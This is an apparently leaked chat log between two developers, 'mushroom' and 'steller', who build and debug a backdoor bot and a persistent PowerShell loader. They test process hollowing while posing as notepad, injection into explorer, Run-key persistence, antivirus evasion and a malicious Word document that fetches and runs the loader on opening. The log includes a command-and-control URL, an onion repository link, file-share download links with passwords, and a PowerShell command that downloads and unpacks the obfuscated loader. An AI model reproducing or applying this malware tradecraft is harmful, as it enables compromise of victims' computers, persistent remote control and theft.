+2020-08-04T15:05:16 mushroom -> steller
+Will the remove command remove the bootloader from the registry?
+
+2020-08-04T15:05:41 mushroom -> steller
+Or just the file? Or both?
+
+2020-08-04T15:11:24 steller -> mushroom
+It's just wrapping up.
+From the ToR:
+* items with an asterisk: the bot is supposed to be non-resident,
+i.e. will NOT be anchored in the system.
+That is why everything that concerns residency (anchoring, updating, removing)
+in the first version DO NOT need to be done.
+But the stubs remain and the idea is that individual (point)
+executions can be resident and support these functions.
+
+2020-08-04T15:12:29 mushroom -> steller
+OK.
+
+2020-08-04T15:13:07 steller -> mushroom
+Most likely explorer should end and reboot. Try it, maybe it's different for you.
+
+2020-08-04T15:22:03 mushroom -> steller
+Is the loader resident?
+
+2020-08-04T15:22:20 mushroom -> steller
+How do you remove it?
+
+2020-08-04T15:23:44 mushroom -> steller
+You don't have anything in your ToR about removing the loader?
+
+2020-08-04T15:26:55 steller -> mushroom
+Yes, the bootloader is permanently stuck in the system. Nothing else gets deleted.
+
+2020-08-04T15:28:27 mushroom -> steller
+Got it.
+
+2020-08-04T15:38:39 steller -> mushroom
+Okay, see you tomorrow.
+
+2020-08-04T15:38:55 mushroom -> steller
+Go for it.
+
+2020-08-05T09:16:26 mushroom -> steller
+Hi which loader to use for testing? The one you sent yesterday or the one in GitLab. It was updated today.
+
+2020-08-05T09:18:02 mushroom -> steller
+The one in the git hung up. Wrote that he was waiting 203 seconds for a command request, I waited 15 minutes, never got the command.
+
+2020-08-05T09:19:33 steller -> mushroom
+Hi. Use the working one for now. There's a slight difference there. What's in the log?
+
+2020-08-05T09:20:02 mushroom -> steller
+waiting 302...
+
+2020-08-05T09:20:12 mushroom -> steller
+Kind of like that last entry.
+
+2020-08-05T09:20:43 mushroom -> steller
+It got a 0 302 command and hung for more than 302 seconds.
+
+2020-08-05T09:23:14 steller -> mushroom
+So this is from the bot log.  That's strange, we should check it out.
+
+2020-08-05T09:23:21 mushroom -> steller
+The one you sent yesterday has worked so far with no problems.
+
+2020-08-05T09:24:25 steller -> mushroom
+I'll upload with encoding and https fixes soon
+
+2020-08-05T09:24:53 mushroom -> steller
+OK.
+
+2020-08-05T09:44:10 mushroom -> steller
+When an error occurs during process hollowing do you send an error code to the server?
+
+2020-08-05T09:44:21 mushroom -> steller
+Can't read target process memory, error: 299
+Sleep before getting new command for 300s...
+
+2020-08-05T09:44:41 mushroom -> steller
+It turned out that the command on the server hangs.
+
+2020-08-05T09:46:13 mushroom -> steller
+Anyway, there was an error in process hollowing and nothing was sent to the server with the error code, it thinks the command is running and it's constantly pending now.
+
+2020-08-05T09:52:25 steller -> mushroom
+Strange how my Sleep before getting new command for 302s works...
+So far I've made almost every command to send GetLastError() to the server at the end. No error description is transmitted.
+
+2020-08-05T09:53:15 mushroom -> steller
+No description needed, just pid: 0 msg: <error code>
+
+2020-08-05T09:53:15 steller -> mushroom
+And you have an error in Sleep before getting new command for 302s...
+Only with hollowing?
+
+2020-08-05T09:53:41 mushroom -> steller
+That was when I got the 0 302 command.
+
+2020-08-05T09:54:06 steller -> mushroom
+You mean you haven't run it before?
+
+2020-08-05T09:54:16 mushroom -> steller
+No.
+
+2020-08-05T09:54:26 steller -> mushroom
+What did you run?
+
+2020-08-05T09:54:41 mushroom -> steller
+I ran it got the command 0 302 and that was it.
+
+2020-08-05T09:55:02 mushroom -> steller
+On the server I made a command hollowing, but the bot never asked for it.
+
+2020-08-05T09:55:26 steller -> mushroom
+I see. Now I'm going to upload the build with encoding and https fixes, maybe this bug is fixed too.
+
+2020-08-05T09:56:29 mushroom -> steller
+Make an error code to be sent when the command completes with an error, nothing is sent to hollowing now if an error occurs in the process of creating it.
+
+2020-08-05T09:56:41 mushroom -> steller
+Base relocation virtual address is 75648
+Can't read target process memory, error: 299
+Sleep before getting new command for 300s...
+
+2020-08-05T09:56:54 mushroom -> steller
+299 did not come to the server.
+
+2020-08-05T09:57:50 mushroom -> steller
+I was the one who ran hollowing twice with timeout 0, two times error 299.
+
+2020-08-05T09:58:20 mushroom -> steller
+I ran the x64 program, masquerading as notepad.
+
+2020-08-05T09:58:41 mushroom -> steller
+6966b29479574d5abb89b8bde1a94a45
+
+2020-08-05T09:59:02 mushroom -> steller
+There you can see what the program is, and the command.
+
+2020-08-05T10:02:16 steller -> mushroom
+Uploaded. Now I will try to reproduce your error. Can you send me TestOutput64.exe?
+
+2020-08-05T10:04:42 mushroom -> steller
+Download: https://qaz.im/load/Ei4YD3/ibQdeK
+Delete: https://qaz.im/index.php?a=delete&q=395712565
+Password: u4`55&b5?.Ltbp}<5
+
+2020-08-05T10:06:08 mushroom -> steller
+C is /SUBSYSTEM Console, U is UNICODE program, without C it is /SUBSYSTEM Windows, without U it is ANSI program.
+
+2020-08-05T10:07:38 mushroom -> steller
+It could be an error due to program incompatibility, although it worked fine with a timeout of 60.
+
+2020-08-05T10:07:59 mushroom -> steller
+And with 0 for the third time 299 error.
+
+2020-08-05T10:08:12 mushroom -> steller
+I'll try to disguise myself as other programs.
+
+2020-08-05T10:09:20 mushroom -> steller
+TestOutput infinitely outputs the Test output line into stdout
+
+2020-08-05T10:23:53 mushroom -> steller
+Can we test the GitLab version now?
+
+2020-08-05T10:27:15 steller -> mushroom
+Nah, I put it on boleggers. As long as there's no change in the rep.
+
+2020-08-05T10:28:12 steller -> mushroom
+Is it supposed to be like this?
+https://51.89.125.28:12280/bots/command?id=ed17f68af885a2b91a416e9f2a19389a
+
+2020-08-05T10:28:19 mushroom -> steller
+I mean the loader.
+
+2020-08-05T10:28:27 steller -> mushroom
+Look at the last output
+
+2020-08-05T10:28:53 mushroom -> steller
+Yes.
+
+2020-08-05T10:28:55 steller -> mushroom
+You said he has some glitches with the git
+
+2020-08-05T10:29:45 mushroom -> steller
+The bootloader?
+
+2020-08-05T10:30:22 mushroom -> steller
+Make the timeout 0
+
+2020-08-05T10:30:34 mushroom -> steller
+background run
+
+2020-08-05T10:31:02 steller -> mushroom
+That was me running it directly. Maybe you have some problems with the bot running from memory, although I don't see much dependence
+
+2020-08-05T10:31:52 steller -> mushroom
+I'll give it a try.
+
+2020-08-05T10:32:02 mushroom -> steller
+I also have everything working with a non-zero timeout, but not with 0.
+
+2020-08-05T10:32:58 mushroom -> steller
+0 timeout is critical, most programs run this way.
+
+2020-08-05T10:33:38 steller -> mushroom
+Does your notepad fall off when you do this?
+
+2020-08-05T10:34:14 mushroom -> steller
+No.
+
+2020-08-05T10:34:50 mushroom -> steller
+It's not in the list of processes. It will pop up with an error when the system shuts down.
+
+2020-08-05T10:35:08 mushroom -> steller
+It gets left hanging as a corrupted process.
+
+2020-08-05T10:39:18 mushroom -> steller
+With 0 timeout none of the masking went through. I'll run the updated version now.
+
+2020-08-05T10:39:34 steller -> mushroom
+I.e. with timeout 0 output to the server only OK?
+
+2020-08-05T10:40:00 mushroom -> steller
+If everything went without errors, just give the pid
+
+2020-08-05T10:40:18 mushroom -> steller
+So you can then terminate the process on it.
+
+2020-08-05T10:40:37 mushroom -> steller
+And if error pid: 0 msg: < error code>
+
+2020-08-05T10:40:56 mushroom -> steller
+pid: 0
+msg: <error code>
+
+2020-08-05T10:41:35 mushroom -> steller
+Same as you send stdout, only pid 0, and instead of stdout the error code.
+
+2020-08-05T10:42:04 mushroom -> steller
+So which loader to use from GitLab or the one you sent yesterday?
+
+2020-08-05T10:43:52 mushroom -> steller
+GitLab isn't working yet. I'm using yesterday's loader.
+
+2020-08-05T10:46:50 steller -> mushroom
+Yes, use a working bootloader for now.
+You said you had a glitchy boot loader on the rep.
+
+2020-08-05T10:47:21 mushroom -> steller
+Yesterday it was like this. Today it has updated.
+
+2020-08-05T10:51:44 steller -> mushroom
+Ah, well, then take it with the new one as you get a chance. There's a small explorer search fix + ps2.0 fixes
+
+2020-08-05T11:11:27 steller -> mushroom
+Fixed bug with timeout 0. I put it into botleggers.
+Made msg too, but haven't checked it yet.
+
+2020-08-05T11:15:08 mushroom -> steller
+OK.
+
+2020-08-05T11:45:27 steller -> mushroom
+Do you happen to have shell code for setting environment variables?
+
+2020-08-05T11:45:46 mushroom -> steller
+No.
+
+2020-08-05T12:16:55 mushroom -> steller
+When a program or dll or script file execution is completed with a non-zero timeout and saved to disk, are they deleted?
+
+2020-08-05T12:22:22 steller -> mushroom
+Not yet. Missed that one.
+
+2020-08-05T12:23:14 mushroom -> steller
+Where do they download to?
+
+2020-08-05T12:23:28 mushroom -> steller
+In Temp?
+
+2020-08-05T12:25:27 steller -> mushroom
+Yes,
+TStr GetTmpFile()
+{
+  char TmpName[FILENAME_MAX];
+  kernel32.getTempPathA(FILENAME_MAX, TmpName);
+  kernel32.getTempFileNameA(TmpName, nullptr, 0, TmpName);
+  return TmpName;
+}
+Plus the script extension.
+
+2020-08-05T12:27:52 mushroom -> steller
+The exe has a tmp extension now. This on the new win 10 causes the window to show that there is no associated program with this file type, make it exe.
+
+2020-08-05T12:38:46 mushroom -> steller
+Check your script dir /s C:\Windows\system32, there will be a large output, the bot will work correctly, timeout 60 seconds.
+
+2020-08-05T12:39:25 mushroom -> steller
+My bot didn't kill the process after 60 seconds, it's still running for 7 minutes.
+
+2020-08-05T12:39:54 mushroom -> steller
+And no response was sent to the server.
+
+2020-08-05T12:41:08 mushroom -> steller
+But in idea it should have killed the process and sent to the server what the process had time to output.
+
+2020-08-05T12:41:56 mushroom -> steller
+The Read timeout in the logs is infinite.
+
+2020-08-05T12:42:30 steller -> mushroom
+Let me see.
+
+2020-08-05T12:42:48 mushroom -> steller
+Sent the result as soon as I manually killed the process.
+
+2020-08-05T12:43:11 steller -> mushroom
+Is it a .bat ?
+
+2020-08-05T12:43:21 mushroom -> steller
+Yes.
+
+2020-08-05T12:45:08 mushroom -> steller
+I ran it with save to disk, but I don't think it will make a difference.
+
+2020-08-05T12:53:21 steller -> mushroom
+Yeah, it's the same through pipe. Did you get a lot of files out?
+
+2020-08-05T12:53:55 mushroom -> steller
+A lot. Until I killed it in the task manager.
+
+2020-08-05T12:54:07 mushroom -> steller
+6966b29479574d5abb89b8bde1a94a45 look there.
+
+2020-08-05T12:54:22 mushroom -> steller
+Penultimate command.
+
+2020-08-05T12:57:23 mushroom -> steller
+After that did with saving to disk cd c:\ dir powershell also 60 seconds timeout passed and silence, killed manually came the answer.
+
+2020-08-05T12:58:12 mushroom -> steller
+There too Read timeout is endless until the process is killed.
+
+2020-08-05T13:06:05 mushroom -> steller
+After this command with large output, now I constantly have to kill the process manually. It turns out it messed up something in the bot there.
+
+2020-08-05T13:07:09 mushroom -> steller
+Now even this script without saving to disk cd c:\\r\ndir\r\n for powershell does not send the result after running until it is killed. Read timeout all the time.
+
+2020-08-05T13:15:34 steller -> mushroom
+I fixed one bug and accidentally added another. Timeout check disappeared. Now I'm going to upload a new build.
+
+2020-08-05T13:17:08 steller -> mushroom
+Uploaded
+
+2020-08-05T13:59:16 steller -> mushroom
+Added .exe to temporary file.
+Fixed file deletion for CreateProcess and .bat/.ps1 dump.
+
+2020-08-05T13:59:33 mushroom -> steller
+OK.
+
+2020-08-05T14:00:07 mushroom -> steller
+Is the Dll deleted as well?
+
+2020-08-05T14:00:48 mushroom -> steller
+Which is run with rundll32.exe.
+
+2020-08-05T14:04:15 mushroom -> steller
+Something didn't delete the bat. Maybe I ran an old version?
+
+2020-08-05T14:04:29 mushroom -> steller
+Have you poured the new one yet?
+
+2020-08-05T14:07:38 mushroom -> steller
+Regarding PARENT, PARENTID, VARS variables. It may be pale that they are set globally for the user and not for the process.
+
+2020-08-05T14:07:57 mushroom -> steller
+Do you use them in the bot?
+
+2020-08-05T14:13:52 steller -> mushroom
+Yes, I did.
+Did you set the timeout?
+I remember about the preliminaries, I'm looking at how to implement them through shellcode.
+Maybe I should turn it off now, because it's not used now.
+
+2020-08-05T14:15:04 mushroom -> steller
+Yes, you can disable it if you don't use it. In fact, only VARS is needed, the group is written in it, but it's not used yet either. But for the future they will be needed, VARS for sure.
+
+2020-08-05T14:15:31 steller -> mushroom
+Although, skpts may be needed by other processes as well
+
+2020-08-05T14:15:49 mushroom -> steller
+Yes, I used the 60 sec timeout. I'll check it again now.
+
+2020-08-05T14:17:13 steller -> mushroom
+I have definitely had the exe's removed.
+Maybe the bat is blocked by cmd. I'll check it now.
+
+2020-08-05T14:22:46 mushroom -> steller
+Not deleted.
+
+2020-08-05T14:32:44 mushroom -> steller
+And ps1 is not deleted.
+
+2020-08-05T14:34:58 steller -> mushroom
+Found a bug.
+
+2020-08-05T14:36:23 steller -> mushroom
+It should be deleted now, check it out.
+
+2020-08-05T14:45:13 mushroom -> steller
+Deleted.
+
+2020-08-05T14:50:34 mushroom -> steller
+I noticed one thing. If the command for example script worked before timeout, still bot waits for timeout, and only then sends the result.
+
+2020-08-05T14:51:01 mushroom -> steller
+ps1 deleted too.
+
+2020-08-05T14:53:19 steller -> mushroom
+You mean through the pipe?
+
+2020-08-05T14:53:47 mushroom -> steller
+ps1 deleted file I mean.
+
+2020-08-05T14:55:11 steller -> mushroom
+Nope. The bot waits for a timeout for scripts, because scripts do not terminate on their own when using pipe
+
+2020-08-05T14:55:14 mushroom -> steller
+exe also deleted.
+
+2020-08-05T14:56:10 steller -> mushroom
+You have to collect stdout/error from them, so they work until timeout
+
+2020-08-05T14:57:40 mushroom -> steller
+For example, the command dir is executed and there is nothing else in the script, but the bot is still waiting for a timeout.
+
+2020-08-05T14:58:21 mushroom -> steller
+And if you put a timeout of a few hours, and the program ran in 5 minutes, will it wait a few hours?
+
+2020-08-05T14:58:26 steller -> mushroom
+So how do you know programmatically that the dir has terminated?
+
+2020-08-05T14:58:35 mushroom -> steller
+I can see from the log.
+
+2020-08-05T14:58:56 steller -> mushroom
+Programmatically see?)
+
+2020-08-05T14:59:15 mushroom -> steller
+In the log output I see dir.
+
+2020-08-05T14:59:39 mushroom -> steller
+And then until Read timeout all the time.
+
+2020-08-05T15:00:03 mushroom -> steller
+And at the end Command was timed out. Terminate cmd process.
+
+2020-08-05T15:00:05 steller -> mushroom
+This is an attempt to read from stdout
+
+2020-08-05T15:01:23 steller -> mushroom
+For scripts this is how it should be, in general
+
+2020-08-05T15:01:59 mushroom -> steller
+I put a timeout of 12 hours for dir, I'll see how he responds.
+
+2020-08-05T15:03:08 steller -> mushroom
+What's the point?
+
+2020-08-05T15:04:12 mushroom -> steller
+Could be that make a big timeout for the program, and it will work for 5 minutes, will wait in vain for the result.
+
+2020-08-05T15:05:37 mushroom -> steller
+TShell::Read(StdOut):
+
+
+    Directory: C:\
+
+
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+d----- 29.05.2020 11:20 AMD
+d----- 24.07.2020 13:21 LLVM
+d----- 07.12.2019 12:14 PerfLogs
+d-r--- 31.07.2020 15:35 Program Files
+d-r--- 15.07.2020 12:05 Program Files (x86)
+d----- 27.05.2020 13:55 Qt
+d-----Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+
+2020-08-05T15:05:49 mushroom -> steller
+And so 12 hours it will be.
+
+2020-08-05T15:06:21 steller -> mushroom
+Well, if you have nothing better to do, you can put 12
+
+2020-08-05T15:06:46 mushroom -> steller
+And if they put 1 hour, and the program will work for 30 seconds.
+
+2020-08-05T15:06:53 steller -> mushroom
+I'm telling you: these are the limitations of implementation.
+
+2020-08-05T15:07:01 mushroom -> steller
+An hour would be wasted.
+
+2020-08-05T15:07:12 steller -> mushroom
+Not a program, a script
+
+2020-08-05T15:08:05 mushroom -> steller
+So you can't monitor the script process the same way you monitor the program process?
+
+2020-08-05T15:10:58 steller -> mushroom
+Well, yes. All commands via stdin are dumped to the console, which waits for commands, and then it's all assembled via stdout the same way. And the console runs until timeout.
+
+2020-08-05T15:11:50 steller -> mushroom
+There is no console-executed-all-commands event like this in winnda.
+
+2020-08-05T15:12:15 mushroom -> steller
+I have the same, only there is a wait or timeout or cmd shutdown for example.
+
+2020-08-05T15:13:46 steller -> mushroom
+So you mean do a cmd /c "..." wrap and wait for it to finish, then close the console?
+
+2020-08-05T15:13:58 mushroom -> steller
+Does reset work if for example at the moment the command is running? Will the command be interrupted?
+
+2020-08-05T15:14:16 mushroom -> steller
+It works.
+
+2020-08-05T15:15:27 mushroom -> steller
+Yes. Wait for either completion or timeout, whichever is faster.
+
+2020-08-05T15:15:52 mushroom -> steller
+And PowerShell as well.
+
+2020-08-05T15:16:19 mushroom -> steller
+WaitForSingleObject with timeout.
+
+2020-08-05T15:18:33 steller -> mushroom
+And after it stdout can be read?
+
+2020-08-05T15:19:00 mushroom -> steller
+stdout is read into the buffer.
+
+2020-08-05T15:19:04 mushroom -> steller
+How about you?
+
+2020-08-05T15:20:50 steller -> mushroom
+You can't read anything after closing the console.
+Is there any way to read not in the buffer?
+
+2020-08-05T15:22:00 mushroom -> steller
+If you don't read it after closing, probably not. Unless you can read everything right before closing.
+
+2020-08-05T15:23:49 steller -> mushroom
+Well, so PeekNamedPipe only reads with the console open, i.e. once it closes, the rest is gone.
+
+2020-08-05T15:24:19 steller -> mushroom
+right after WaitForSingleObject the last piece is lost
+
+2020-08-05T15:25:11 mushroom -> steller
+I have it read as long as the process is running. As soon as the process is over, the readFile function returns FALSE.
+
+2020-08-05T15:25:52 mushroom -> steller
+How do you read it all at once?
+
+2020-08-05T15:26:00 mushroom -> steller
+Or as it comes in?
+
+2020-08-05T15:27:07 steller -> mushroom
+PeekNamedPipe gives out how much you can read
+
+2020-08-05T15:28:32 mushroom -> steller
+I have it like this. I created a pip and called a function like this:
+_Success_(return != 0)
+BOOL readPipe(_In_ HANDLE pipe, _Outptr_ PBYTE* buffer, _Out_ PSIZE_T size)
+{
+    DWORD readed = 0;
+    DWORD needed = 0;
+    DWORD offset = 0;
+
+    BYTE tmp[4096];
+    DWORD resultSize = 4096;
+    PBYTE result = (PBYTE)HeapAlloc(GetProcessHeap(), 0, resultSize);
+    if (!result)
+        return FALSE;
+
+    while (kernel32.readFile(pipe, tmp, 4096, &readed, NULL))
+    {
+        needed += readed;
+        if (resultSize < needed)
+        {
+            PBYTE tmp = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, result, needed);
+            if (!tmp)
+            {
+                HeapFree(GetProcessHeap(), 0, result);
+                return FALSE;
+            }
+
+            result = tmp;
+            resultSize = needed;
+        }
+
+        CopyMemory(&result[offset], tmp, readed);
+        offset += readed;
+    }
+
+    *buffer = result;
+    *size = offset;
+    return TRUE;
+}
+
+2020-08-05T15:29:10 mushroom -> steller
+And it's in a separate thread so it doesn't block. It will end just as soon as the process finishes.
+
+2020-08-05T15:29:25 mushroom -> steller
+It's kind of like that for me.
+
+2020-08-05T15:30:30 steller -> mushroom
+And look at the code https://n4iaacb37wmqclht.onion/steller/backdoor/blob/master/backdoor/stdio-pipe.cpp
+
+2020-08-05T15:32:02 mushroom -> steller
+No access.
+
+2020-08-05T15:32:37 steller -> mushroom
+Opened
+
+2020-08-05T15:33:44 mushroom -> steller
+It's generally not critical that it waits for timeout always, but there may be waiting for nothing, as I said. Depends on how this bot will be used.
+
+2020-08-05T15:33:45 mushroom -> steller
+403
+
+2020-08-05T15:34:17 steller -> mushroom
+And now?
+
+2020-08-05T15:34:25 mushroom -> steller
+Appeared.
+
+2020-08-05T15:35:53 mushroom -> steller
+It reads to the buffer there, too.
+
+2020-08-05T15:36:28 mushroom -> steller
+It's not in a separate thread, but every 100 msec it's read.
+
+2020-08-05T15:36:46 mushroom -> steller
+So as not to block the main stream.
+
+2020-08-05T15:37:24 mushroom -> steller
+Kind of like the function I wrote above.
+
+2020-08-05T15:37:38 mushroom -> steller
+This bool TStdIoPipe::Read(TStr &StdOut, TStr &StdErr, int TimeoutMs)
+
+2020-08-05T15:38:43 mushroom -> steller
+It turns out to read in progress (every 100 ms).
+
+2020-08-05T15:39:28 mushroom -> steller
+And I have a separate thread in the blocking reads, so it will read everything that the process output while it worked.
+
+2020-08-05T15:40:08 mushroom -> steller
+kernel32.readFile(pipe, tmp, 4096, &readed, NULL) will not return FALSE until the process closes its pipe.
+
+2020-08-05T15:43:11 steller -> mushroom
+I see what you mean. And if the shell closes at the moment when you copy the buffer, the data may be lost, it won't wait until you get to ReadFile&
+
+2020-08-05T15:44:09 mushroom -> steller
+Nothing will happen. Pipe has its own buffer, the data is copied to the buffer from it.
+
+2020-08-05T15:44:40 mushroom -> steller
+When you create a pip, you can specify the size of this internal buffer.
+
+2020-08-05T15:45:41 steller -> mushroom
+I'll have to check it out, maybe it really is the best option.
+Alright, I'll go. See you later.
+
+2020-08-05T15:45:50 mushroom -> steller
+Bye.
+
+2020-08-11T15:11:22 mushroom -> steller
+Hi. PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)
+At C:\Users\TestUser\AppData\Local\Temp\AF05.ps1:1855 char:9
++ Throw (("{4}{11}{16}{23}{10}{21}{8}{2}{14}{6}{0}{13}{7}{15}{ .
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo : OperationStopped: (PE platform doe...d in (32/64bit):String) [], RuntimeException
+    + FullyQualifiedErrorId : PE platform doesn't match the architecture of the process it is being loaded in (32/64bit
+   t)
+
+2020-08-11T15:12:06 mushroom -> steller
+This is when the 32 bit word loader starts. When 64 bit there are no errors.
+
+2020-08-11T15:14:56 steller -> mushroom
+Hi. Is this from gitlab?
+
+2020-08-11T15:17:17 mushroom -> steller
+No
+
+2020-08-11T15:18:37 mushroom -> steller
+Same thing I tried to run the loader from powershell x86 version/
+
+2020-08-11T15:19:41 steller -> mushroom
+So, how is it working?
+
+2020-08-11T15:20:02 mushroom -> steller
+Same error.
+
+2020-08-11T15:20:39 mushroom -> steller
+x64 works, x86 doesn't.
+
+2020-08-11T15:21:17 steller -> mushroom
+I see. You better get a new one from gitlab.
+I'll check this error now.
+
+2020-08-11T15:24:36 steller -> mushroom
+By the way from the TOR:
+6.1 If running an x86 loader on an x64 machine, the first thing it should do is update
+ to the x64 version of itself, and then load only the x64 bot.
+
+This means that on an x64 bit machine you only need to run the x64 bot and so on.
+
+2020-08-11T15:25:28 steller -> mushroom
+Did you test it on win 32bit?
+
+2020-08-11T15:26:06 mushroom -> steller
+I tested on 64 bit Win 10 with Office 32 bit.
+
+2020-08-11T15:26:42 steller -> mushroom
+It turns out that for the sake of purity of the experiment we need a 32 bit OS
+
+2020-08-11T15:26:49 steller -> mushroom
+use
+
+2020-08-11T15:27:53 mushroom -> steller
+So it's not guaranteed to work for Office 32 bit? A lot of people have it 32 bit and Windows is 64 bit.
+
+2020-08-11T15:29:55 steller -> mushroom
+Are you implementing it in your office?
+You have explorer in the loader.
+
+2020-08-11T15:30:55 mushroom -> steller
+I paste your script into a Word document, it pulls to disk and runs when I open it.
+
+2020-08-11T15:32:05 mushroom -> steller
+It turns out the 32 bit process is created because Word is 32 bit.
+
+2020-08-11T15:32:21 steller -> mushroom
+The script does not depend on the bitness of the office.
+It loads the bot according to the bit mode of the system.
+And injects it into explorer.
+Somewhere in the last step there is an error.
+
+2020-08-11T15:33:20 steller -> mushroom
+I recently had an update on finding the bitrate:
+$Is64Sys = ($env:PROCESSOR_ARCHITECTURE -eq "AMD64")
+Can you run it through the office?
+
+2020-08-11T15:33:39 mushroom -> steller
+I just run the script from a 32 bit process, gets powershell x86 runs the script.
+
+2020-08-11T15:33:50 steller -> mushroom
+The definition code used to be unreliable
+
+2020-08-11T15:34:57 steller -> mushroom
+Yes, he gives out false in it.
+
+2020-08-11T15:41:09 mushroom -> steller
+I will try specifying the full powershell path to take the same bitstring as the system.
+
+2020-08-11T15:43:50 steller -> mushroom
+It's in the script. I'll fix it now.
+
+2020-08-11T15:43:55 steller -> mushroom
+*mistake
+
+2020-08-11T15:45:48 steller -> mushroom
+Try this one:
+D:\Project\backdoor\persist-loader\persist-loader.obf.ps1
+Dowload URL:
+https://file.io/lgX3Rdgrpt35
+Pass:
+8-%Ev?zLW9B)wP3m{23!
+Download command:
+powershell (new-object System.Net.WebClient).DownloadFile('https://file.io/lgX3R
+dgrpt35', '1.rar') ; & "c:\Program files\WinRar\unrar.exe" x -p "8-%Ev?zLW9B)wP3m
+{23!" 1.rar
+
+2020-08-11T15:47:05 mushroom -> steller
+I'll try to make a document with it tomorrow.
+
+2020-08-11T15:47:31 steller -> mushroom
+Yes, go ahead. Corrected the definition of OS bitness there
+
+2020-08-12T09:37:14 mushroom -> steller
+Hi. Doesn't work the same way with Word 32 uploader you sent yesterday.
+
+2020-08-12T09:42:00 steller -> mushroom
+Hi.
+I'll check it out now.
+
+2020-08-12T09:55:25 steller -> mushroom
+Updated the x86 bot.
+It works for me.
+
+2020-08-12T09:55:58 mushroom -> steller
+Can I check?
+
+2020-08-12T09:56:13 steller -> mushroom
+Wait, I'll check x86)
+
+2020-08-12T09:56:38 mushroom -> steller
+Check it this way. Run the bootloader from under PowerShell x86.
+
+2020-08-12T09:57:17 steller -> mushroom
+And in win7 32 bit too
+
+2020-08-12T09:59:31 mushroom -> steller
+PowerShell x86 run in 64 bit Windows and run the loader that way. That's when the error occurs.
+
+2020-08-12T09:59:51 steller -> mushroom
+Yes, I can see that.
+
+2020-08-12T10:13:27 steller -> mushroom
+Can you run a 64 bit ps from Word 32?
+
+2020-08-12T10:35:27 mushroom -> steller
+I tried running powershell at the direct address? same error. Although the 64 bit powershell is in this path.
+
+2020-08-12T10:36:53 mushroom -> steller
+It turns out that Word 32 bit still affects, it runs powershell.
+
+2020-08-12T10:41:34 steller -> mushroom
+You have ps in NOT in the address space of Word, don't you?
+
+2020-08-12T10:43:49 mushroom -> steller
+A 32 bit program still runs 32 bit programs. No matter how you specify the paths.
+
+2020-08-12T10:44:01 steller -> mushroom
+So you have a script.
+
+2020-08-12T10:44:14 mushroom -> steller
+word just starts the powershell process
+
+2020-08-12T10:46:01 steller -> mushroom
+Tested it on win x86 - it works
+
+2020-08-12T10:46:51 steller -> mushroom
+You need to run x64 somehow from Word. You could create a task, for example. Why run it directly?
+
+2020-08-12T10:48:08 mushroom -> steller
+Task creation is stolen by antivirus at once.
+
+2020-08-12T10:48:31 mushroom -> steller
+Can't you check in POwerShell that this is a Wow64 process?
+
+2020-08-12T10:49:46 mushroom -> steller
+I will try C:\Windows\Sysnative
+
+2020-08-12T10:50:17 steller -> mushroom
+Yes. Everything is checked there. There is a restriction on using IntPtr:
+#PowerShell needs to be the same bit as the PE being loaded for IntPtr to work correctly
+
+2020-08-12T10:51:25 steller -> mushroom
+The loader on ps uses reg->run. Why should your script get stolen?
+
+2020-08-12T10:52:41 mushroom -> steller
+It's an autoload.
+
+2020-08-12T10:53:39 steller -> mushroom
+A ps script is not pale, but a vba script is pale?
+
+2020-08-12T10:54:23 mushroom -> steller
+Autoload does not work, then only after a reboot will the script start.
+
+2020-08-12T10:54:43 steller -> mushroom
+And the bot will also start after a reboot
+
+2020-08-12T10:55:15 mushroom -> steller
+In fact, that's what's happening right now. Doesn't start right away because of an error, but it starts after a reboot.
+
+2020-08-12T10:57:41 steller -> mushroom
+The ps script uses a reassignment of intptr pointers to call winai. There seems to be no way to replace them with uint64, for example.
+You'll probably have to run the right ps.
+
+2020-08-12T10:58:11 mushroom -> steller
+I am going to try C:\Windows\Sysnative
+
+2020-08-12T10:58:31 mushroom -> steller
+To prevent forwarding from working in a 32 bit process on WOW64
+
+2020-08-12T11:33:41 mushroom -> steller
+Can you do it like this? Runs the loader script, if it is Wow64 process, restarts itself, but already so %windir%\sysnative\windowspowershell\v1.0\powershell.exe <loader>
+
+2020-08-12T11:37:17 steller -> mushroom
+I'll try
+
+2020-08-12T11:39:31 mushroom -> steller
+sysnative only works for 32 bit Wow64 process, if you write sysnative in 64 bit process it won't work, that's why you should make sure that this is Wow64 process before using sysnative in path.
+
+2020-08-12T12:11:17 steller -> mushroom
+Did a restart in x64. Works from ps x86
+D:\Project\backdoor\persist-loader\persist-loader.obf.ps1
+Dowload URL:
+https://file.io/ERZbY2BlXMZN
+Pass:
+yr-(t^<+VlIGbb#C_VvZ
+Download command:
+powershell (new-object System.Net.WebClient).DownloadFile('https://file.io/ERZbY
+2BlXMZN', '1.rar') ; & "c:\Program files\WinRar\unrar.exe" x -p "yr-(t^<+VlIGbb#C
+_VvvZ" 1.rar
+
+2020-08-12T12:15:02 mushroom -> steller
+OK. I'll see/.
+
+2020-08-12T12:28:25 mushroom -> steller
+It's working.
+
+2020-08-12T12:30:13 steller -> mushroom
+Great 👍
+
+2020-08-19T12:40:30 steller -> mushroom
+Hi.
+I will be gone next week.
+Is there anything you need to test, add, or build?
+
+2020-08-19T12:56:44 mushroom -> steller
+Hi. No. All there is enough. We'll just have to do the https bot. Waiting for Buzu to give your kit to work.
+
+2020-08-19T12:57:20 mushroom -> steller
+And the booze won't be until after August 29.
+
+2020-08-19T12:58:55 steller -> mushroom
+It already has https
+
+2020-08-19T12:59:50 steller -> mushroom
+Have you tried the x86 bot?
+
+2020-08-19T13:01:53 mushroom -> steller
+No. I haven't.
+
+2020-08-19T13:19:17 mushroom -> steller
+Can the loader and bot send all requests via https if necessary?
+
+2020-08-19T13:26:14 steller -> mushroom
+The latest builds use https.
+
+2020-08-19T14:32:23 mushroom -> steller
+Just watched runbat channel 60 cd c:\\r\ndir\r\n
+
+2020-08-19T14:32:34 mushroom -> steller
+The answer is blank.
+
+2020-08-19T14:32:42 mushroom -> steller
+pid: 13992
+stdout:
+stderr:
+
+msg: 0
